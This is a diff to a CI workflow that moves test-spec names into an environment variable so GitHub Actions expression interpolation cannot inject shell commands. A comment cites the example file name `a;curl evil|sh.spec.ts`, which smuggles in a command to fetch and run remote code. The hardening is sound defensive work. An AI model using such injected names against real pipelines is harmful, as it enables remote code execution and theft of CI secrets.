@@ -568,9 +568,14 @@ jobs:
         working-directory: l1-contracts/test/anvil-interop
         env:
           ANVIL_INTEROP_MAX_PARALLEL_WORKERS: "4"
+          # Via env, not interpolated into the script: `${{ }}` is expanded into the shell *text*
+          # before bash sees it, so a spec file named `a;curl evil|sh.spec.ts` would execute. The
+          # planner also rejects such names, but the boundary is enforced on both sides. Unquoted
+          # below because word-splitting on spaces is exactly what the loop wants.
+          SPECS: ${{ matrix.group.specs }}
         run: |
           args=""
-          for spec in ${{ matrix.group.specs }}; do
+          for spec in $SPECS; do
             args="$args --spec test/anvil-interop/test/hardhat/$spec"
           done
           echo "Running${args}"
